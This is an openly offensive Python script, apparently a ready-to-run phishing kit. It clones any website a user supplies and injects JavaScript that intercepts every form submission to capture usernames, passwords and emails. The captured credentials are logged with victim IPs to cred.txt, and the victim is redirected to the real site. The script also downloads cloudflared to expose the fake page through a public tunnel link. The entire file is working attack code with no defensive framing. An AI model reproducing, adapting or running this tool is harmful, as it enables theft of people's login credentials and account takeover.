import os
import sys
import time
import threading
import subprocess
import re
import json
import urllib3
from http.server import HTTPServer, SimpleHTTPRequestHandler

YELLOW = '\033[93m'
RESET = '\033[0m'

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import requests
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "requests", "pysocks"], capture_output=True)
    import requests

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    banner = f"""{YELLOW}

   ▄████▄ ▄▄  ▄▄ ▄▄▄▄▄ █████▄ ▄▄ ▄▄ ▄▄  ▄▄▄▄ ▄▄ ▄▄ 
   ██  ██ ███▄██ ██▄▄  ██▄▄█▀ ██▄██ ██ ███▄▄ ██▄██ 
   ▀████▀ ██ ▀██ ██▄▄▄ ██     ██ ██ ██ ▄▄██▀ ██ ██ 
        
         ═══════════════════════════════════              
 ╔═══════════════════════════════════════════════════╗
 ╩           dev - ST4R-SHINY  || v1.0               ╩        

          Clone all web for phishing with url 
 ╦                                                   ╦
 ╚═══════════════════════════════════════════════════╝{RESET}
"""
    print(banner)

def check_cloudflared():
    if os.path.exists("cloudflared.exe"):
        return True
    print(f"{YELLOW}[*] downloading cloudflared...{RESET}")
    url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    try:
        r = requests.get(url, stream=True)
        with open("cloudflared.exe", "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"{YELLOW}[+] cloudflared downloaded{RESET}")
        return True
    except Exception as e:
        print(f"{YELLOW}[-] failed to download cloudflared{RESET}")
        return False

def download_page(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }
    try:
        resp = requests.get(url, headers=headers, timeout=15, verify=False)
        resp.raise_for_status()
        return resp.text
    except:
        return None

def inject_phishing_script(html, original_url):
    original_url_escaped = original_url.replace("'", "\\'")
    script = f'''<script>
(function() {{
    var originalUrl = '{original_url_escaped}';
    function captureAllForms() {{
        var forms = document.querySelectorAll('form');
        for (var f = 0; f < forms.length; f++) {{
            var form = forms[f];
            form.addEventListener('submit', function(e) {{
                e.preventDefault();
                e.stopPropagation();
                var data = {{}};
                var inputs = this.querySelectorAll('input, select, textarea');
                for (var i = 0; i < inputs.length; i++) {{
                    var input = inputs[i];
                    if (input.name && input.value && input.type !== 'submit' && input.type !== 'button') {{
                        data[input.name] = input.value;
                    }}
                    if (input.type === 'password' && input.value) {{
                        data['password_field'] = input.value;
                    }}
                    if (input.type === 'email' && input.value) {{
                        data['email_field'] = input.value;
                    }}
                    if (input.type === 'text' && input.value && (input.name.toLowerCase().includes('user') || input.placeholder.toLowerCase().includes('user'))) {{
                        data['username_field'] = input.value;
                    }}
                }}
                var submitButtons = this.querySelectorAll('button[type="submit"], input[type="submit"]');
                var buttonClicked = submitButtons[0] ? submitButtons[0].innerText || submitButtons[0].value : 'submit';
                data['submit_button'] = buttonClicked;
                data['timestamp'] = new Date().toISOString();
                data['url'] = window.location.href;
                data['userAgent'] = navigator.userAgent;
                fetch('/c', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify(data)
                }});
                setTimeout(function() {{
                    window.location.href = originalUrl;
                }}, 100);
            }});
        }}
    }}
    if (document.readyState === 'loading') {{
        document.addEventListener('DOMContentLoaded', captureAllForms);
    }} else {{
        captureAllForms();
    }}
}})();
</script>'''
    if '</body>' in html:
        return html.replace('</body>', script + '\n</body>')
    else:
        return html + script

creds = []

class PhishHandler(SimpleHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def do_GET(self):
        if self.path == '/':
            self.path = '/site/index.html'
        path = self.path.lstrip('/')
        if os.path.exists(path) and os.path.isfile(path):
            with open(path, 'rb') as f:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/c':
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length)
            try:
                cred = json.loads(data.decode())
                cred['ip'] = self.client_address[0]
                creds.append(cred)
                print(f"\n{YELLOW}[!] CREDENTIAL CAPTURED!{RESET}")
                print(f"{YELLOW}========== CAPTURED DATA =========={RESET}")
                for k, v in cred.items():
                    if k not in ['timestamp', 'url', 'userAgent', 'ip']:
                        print(f"{YELLOW}  {k}: {v}{RESET}")
                print(f"{YELLOW}===================================={RESET}")
                print(f"{YELLOW}  IP: {cred.get('ip', 'Unknown')}{RESET}")
                print(f"{YELLOW}  TIME: {cred.get('timestamp', 'Unknown')}{RESET}")
                print(f"{YELLOW}  TOTAL CAPTURED: {len(creds)}{RESET}")
                print(f"{YELLOW}===================================={RESET}")
                with open("cred.txt", "a", encoding='utf-8') as f:
                    f.write(json.dumps(cred, indent=2) + "\n" + "-"*50 + "\n")
            except Exception as e:
                print(f"{YELLOW}[-] Error parsing: {e}{RESET}")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')

def main():
    clear()
    banner()
    target = input(f"{YELLOW}URL >>> {RESET}").strip()
    print(f"{YELLOW}starting phishing...{RESET}")
    if not check_cloudflared():
        input(f"{YELLOW}\npress enter to exit...{RESET}")
        return
    os.makedirs("site", exist_ok=True)
    print(f"{YELLOW}[*] cloning target website...{RESET}")
    html = download_page(target)
    if html is None:
        html = '''<!DOCTYPE html>
<html><head><title>Login</title></head>
<body style="background:black;color:white;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial">
<div style="background:#1a1a1a;padding:40px;border-radius:10px;width:350px">
<h2 style="color:yellow">Sign In</h2>
<form method="POST">
<input type="text" name="username" placeholder="Username or Email" style="width:100%;padding:10px;margin:10px 0;background:#333;color:white;border:none;border-radius:5px"><br>
<input type="password" name="password" placeholder="Password" style="width:100%;padding:10px;margin:10px 0;background:#333;color:white;border:none;border-radius:5px"><br>
<button type="submit" style="width:100%;padding:10px;background:yellow;color:black;border:none;border-radius:5px;cursor:pointer">Log in</button>
</form>
</div>
</body></html>'''
    html = inject_phishing_script(html, target)
    with open("site/index.html", "w", encoding='utf-8') as f:
        f.write(html)
    print(f"{YELLOW}[+] site cloned and injected{RESET}")
    server = HTTPServer(('0.0.0.0', 8080), PhishHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"{YELLOW}[+] server running on port 8080{RESET}")
    time.sleep(1)
    proc = subprocess.Popen(
        ['cloudflared.exe', 'tunnel', '--url', 'http://localhost:8080'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
    )
    tunnel_url = None
    for _ in range(30):
        line = proc.stderr.readline()
        if line:
            match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
            if match:
                tunnel_url = match.group(0)
                break
        time.sleep(0.5)
    if tunnel_url:
        print(f"\n{YELLOW}[+] TUNNEL ACTIVE!{RESET}")
        print(f"{YELLOW}    Fake link: {tunnel_url}{RESET}")
        print(" ")
    else:
        print(f"{YELLOW}[-] tunnel failed{RESET}")
        proc.terminate()
        input(f"{YELLOW}\npress enter to exit...{RESET}")
        return
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] shutting down...{RESET}")
        proc.terminate()
        server.shutdown()
        print(f"{YELLOW}[+] total credentials captured: {len(creds)}{RESET}")
        print(f"{YELLOW}[+] saved to cred.txt{RESET}")
        input(f"{YELLOW}\npress enter to exit...{RESET}")

if __name__ == "__main__":
    main()